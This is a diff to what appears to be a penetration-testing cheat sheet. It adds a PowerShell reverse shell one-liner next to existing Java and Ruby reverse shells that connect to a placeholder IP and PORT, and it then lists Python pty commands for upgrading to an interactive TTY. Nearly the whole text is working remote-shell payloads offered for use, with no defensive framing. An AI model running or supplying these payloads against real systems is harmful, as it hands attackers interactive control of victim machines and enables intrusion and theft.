@@ -16,9 +16,10 @@ r = Runtime.getRuntime()
 p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/IP/PORT;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
 p.waitFor() (via java)<br />
 or<br />
-ruby -rsocket -e'f=TCPSocket.open("IP",PORT).to_i;exec sprintf("/bin/bash -i <&%d >&%d 2>&%d",f,f,f)' (via ruby)
-
-## getting a tty shell:-
+ruby -rsocket -e'f=TCPSocket.open("IP",PORT).to_i;exec sprintf("/bin/bash -i <&%d >&%d 2>&%d",f,f,f)' (via ruby)<br />
+or<br />
+powershell -c "$client = New-Object System.Net.Sockets.TCPClient("IP",PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()" (via powershell)
+# getting a tty shell:-
 python -c ‘import pty; pty.spawn("/bin/bash")’<br />
 or<br />
 python3 -c ‘import pty; pty.spawn("/bin/bash")’<br />
